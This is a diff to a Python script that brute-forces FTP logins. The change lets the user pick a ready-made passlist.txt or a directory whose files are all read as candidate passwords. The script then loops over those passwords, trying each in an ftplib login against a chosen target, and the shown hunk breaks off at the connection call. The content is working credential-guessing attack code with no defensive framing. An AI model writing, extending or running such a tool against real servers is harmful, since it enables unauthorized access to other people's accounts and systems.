@@ -22,21 +22,40 @@ username = input("> ").strip()
 if username == "":
     username = "anonymous"
 
-print("📁 Password list file (example: passlist.txt):")
-wordlist_path = input("> ").strip()
+print("Do you wanna use a ready-made passlist or your passlist? (y or n)")
+use_ready = input("> ").lower()
 
-try:
+passwords = []
+
+if use_ready == "y":
+    wordlist_path = "passlist.txt"
+    if not os.path.isfile(wordlist_path):
+        print(f"❌ File not found: {wordlist_path}")
+        exit()
     with open(wordlist_path, "r", encoding="latin-1") as file:
-        passwords = file.readlines()
-except FileNotFoundError:
-    print("❌ Password list not found.")
+        passwords = [line.strip() for line in file if line.strip()]
+else:
+    print("Enter your passlist directory (relative to current directory):")
+    dir_path = input("> ").strip()
+    if not os.path.isdir(dir_path):
+        print(f"❌ Directory not found: {dir_path}")
+        exit()
+    # Dizin içindeki tüm dosyaları oku
+    for filename in os.listdir(dir_path):
+        file_path = os.path.join(dir_path, filename)
+        if os.path.isfile(file_path):
+            with open(file_path, "r", encoding="latin-1") as file:
+                lines = [line.strip() for line in file if line.strip()]
+                passwords.extend(lines)
+
+if not passwords:
+    print("❌ No passwords found to try.")
     exit()
 
 os.system("clear")
-print(f"\n🚀 Starting FTP brute-force on {target} as {username}...\n")
+print(f"\n🚀 Starting FTP brute-force on {target} as {username} with {len(passwords)} passwords...\n")
 
 for password in passwords:
-    password = password.strip()
     print(f"🔍 Trying password: {password}")
     try:
         ftp = ftplib.FTP(target)
